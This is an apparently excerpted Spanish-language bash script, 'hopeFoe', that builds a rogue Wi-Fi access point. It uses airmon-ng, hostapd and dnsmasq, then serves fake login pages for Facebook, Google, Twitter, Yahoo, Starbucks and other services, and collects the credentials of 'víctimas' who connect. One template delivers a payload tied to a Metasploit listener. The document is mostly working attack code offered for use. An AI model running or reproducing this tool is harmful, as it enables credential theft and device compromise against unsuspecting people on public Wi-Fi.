...
# hopeFoe v1.0,RJM @MrX (Nick Russell)
...
function banner(){
    ...
    echo -e "   ,;                     ;,"
    sleep 0.05
    echo -e "  ;                         ;   ${endColour}${yellowColour}(${endColour}${grayColour}Hecho por ${endColour}${blueColour}RJM  ${endColour}${purpleColour}La mente no tiene límites, el tiempo si${endColour}${yellowColour})${endColour}${redColour}"
    sleep 0.05
    echo -e " ,'                         ',"
    sleep 0.05
    echo -e ",;                           ;,"
    sleep 0.05
    echo -e "; ;      .           .      ; ;  ${endColour}${blueColour}  _                      ______         ${endColour}"
    sleep 0.05
    echo -e "| ;   ______       ______   ; |  ${endColour}${blueColour} | |                    |  ____|        ${endColour}"
    sleep 0.05
    echo -e "|  "/~"     ~" "." "~     "~"'  |${endColour}${blueColour} | |__   ___  _ __   ___| |__ ___   ___ ${endColour}"
    sleep 0.05
    echo -e "|  ~  ,-~~~^~, | ,~^~~~-,  ~  |  ${endColour}${blueColour} | '_ \ / _ \| '_ \ / _ \  __/ _ \ / _ ´${endColour}"
    sleep 0.05
    echo -e " |   |        }:{        |   |   ${endColour}${blueColour} | | | | (_) | |_> |  __/ | | (_) |  __/${endColour}"
    sleep 0.05
    echo -e " |   l       / | \       !   |   ${endColour}${blueColour} |_| |_|\___/| .__/ \___|_|  \___/ \___|${endColour}"
    sleep 0.05
    echo -e " .~  (__,.--" '.^.' "--.,__)  ~. ${endColour}${blueColour}             | |                        ${endColour}"
    sleep 0.05
    echo -e " |     ---;' / | \ ';---     |   ${endColour}${blueColour}             |_|                        ${endColour}"
    sleep 0.05
    echo -e "  \__.       \/^\/       .__/"
    sleep 0.05
    echo -e "   V| \                 / |V"
    sleep 0.05
    echo -e "    | |T~\___!___!___/~T| |"
    sleep 0.05
    echo -e "    | |'IIII_I_I_I_IIII'| |"
    sleep 0.05
    echo -e "    |  \,III I I I III,/  |"
    sleep 0.05
    echo -e "     \   '~~~~~~~~~~'    /"
    sleep 0.05
    echo -e "       \   .       .   /  "
...
function dependencies(){
    sleep 1.5; counter=0
    echo -e "\n${yellowColour}[*]${endColour}${grayColour} Analizando Programas...\n"
    sleep 1
    ...
    if [ "$(echo $counter)" == "3" ]; then
        echo -e "\n${yellowColour}[*]${endColour}${grayColour} Iniciando...\n"
        sleep 3
    else
...
function startAttack(){
    ...
    # Array de plantillas
    plantillas=(facebook-login google-login usfa-login starbucks-login twitter-login yahoo-login cliqq-payload optimumwifi all_in_one)
    ...
    echo -ne "${yellowColour}[*]${endColour}${grayColour} Plantilla a utilizar (facebook-login, google-login, usfa-login, starbucks-login, twitter-login, yahoo-login, cliqq-payload, all_in_one, optimumwifi):${endColour} " && read template
...
function guiMode(){
    whiptail --title "hopeFoe - by RJM" --msgbox "Bienvenido a hopeFoe" 8 78
    whiptail --title "hopeFoe - by RJM" --msgbox "Deja que compruebe que cuentas con todos los programas necesarios antes de empezar..." 8 78
    ...
    if [ $counter_dep -eq "3" ]; then
        whiptail --title "hopeFoe - by RJM" --msgbox "Perfecto, parece ser que cuentas con todo lo necesario..." 8 78
        tput civis
    else
        whiptail --title "hopeFoe - by RJM" --msgbox "Se ve que te faltan algunas dependencias, necesito que cuentes con las utilidades php, dnsmasq y hostapd instaladas" 8 78
        exit 1
    fi
    ...
    whiptail --title "hopeFoe - by RJM" --msgbox "A continuación, te voy a listar tus interfaces de red disponibles, necesitaré que escojas aquella que acepte el modo monitor" 8 78
    ...
    checker=0; while [ $checker -ne 1 ]; do
        choosed_interface=$(whiptail --inputbox "Interfaces de red disponibles:\n\n$(ifconfig | cut -d ' ' -f 1 | xargs | tr -d ':' | tr ' ' '\n' | while read line; do echo "[*] $line"; done)" 13 78 --title "hopeFoe - IntRJM de red" 3>&1 1>&2 2>&3)
        for interface in $(cat iface); do
            if [ "$choosed_interface" == "$interface" ]; then
                checker=1
            fi
        done; if [ $checker -eq 0 ]; then whiptail --title "hopeFoe - ErrRJMa selección de interfaz" --msgbox "La interfaz proporcionada no existe, vuelve a introducir la interfaz y asegúrate de que sea correcta" 8 78; fi
    done
    
    tput civis; whiptail --title "hopeFoe - by RJM" --msgbox "A continuación se va a configurar la interfaz $choosed_interface en modo monitor..." 8 78
    tput civis; airmon-ng start $choosed_interface > /dev/null 2>&1; choosed_interface="${choosed_interface}mon"
    
    rm iface 2>/dev/null
    use_ssid=$(whiptail --inputbox "Introduce el nombre del punto de acceso a utilizar (Ej: wifiGratis):" 8 78 --title "hopeFoe - by RJM" 3>&1 1>&2 2>&3)
    whiptail --title "hopeFoe - by RJM" --checklist \
    ...
    whiptail --title "hopeFoe - by RJM" --msgbox "Perfecto, voy a crearte unos archivos de configuración para desplegar el ataque..." 8 78
    ...
    # Array de plantillas
    plantillas=(facebook-login usfa-login google-login starbucks-login twitter-login yahoo-login cliqq-payload optimumwifi all_in_one)
    
    whiptail --title "hopeFoe - by RJM" --msgbox "¡Listo!, hora de escoger tu plantilla" 8 78
    
    whiptail --title "hopeFoe - by RJM" --checklist --separate-output "Selecciona la plantilla que desees utilizar" 20 103 12 \
    facebook-login "Plantilla de inicio de sesión de Facebook" OFF \
    usfa-login "Plantilla de inicio de sesión de Usfa" OFF \
    ...
    if [ $check_plantillas -eq 1 ]; then
        whiptail --title "hopeFoe - by RJM" --msgbox "¡Listos para la batalla!, en breve el punto de acceso estará montado y será cuestión de esperar a que tus víctimas se conecten" 8 78
        tput civis; pushd $template > /dev/null 2>&1
        php -S 192.168.1.1:80 > /dev/null 2>&1 &
        sleep 2
        popd > /dev/null 2>&1; getCredentials
        ...
        php -S 192.168.1.1:80 > /dev/null 2>&1 &
        sleep 2
        whiptail --title "hopeFoe - by RJM" --msgbox "Configura desde otra consola un Listener en Metasploit de la siguiente forma:\n\n$(cat msfconsole.rc)" 15 78
        popd > /dev/null 2>&1; getCredentials
    else
        whiptail --title "hopeFoe - by RJM" --msgbox "Veo que prefieres usar tu propia plantilla, sabia elección :)" 8 78
        template=$(whiptail --title "hopeFoe - by RJM" --inputbox "¡Pues vamos a ello!, dime el nombre de tu plantilla (debes crear un directorio con el mismo nombre):" 13 78 --title "hopeFoe - PlaRJMpersonalizada" 3>&1 1>&2 2>&3)
        pushd $template > /dev/null 2>&1
        php -S 192.168.1.1:80 > /dev/null 2>&1 &
        sleep 2
        popd > /dev/null 2>&1; getCredentials
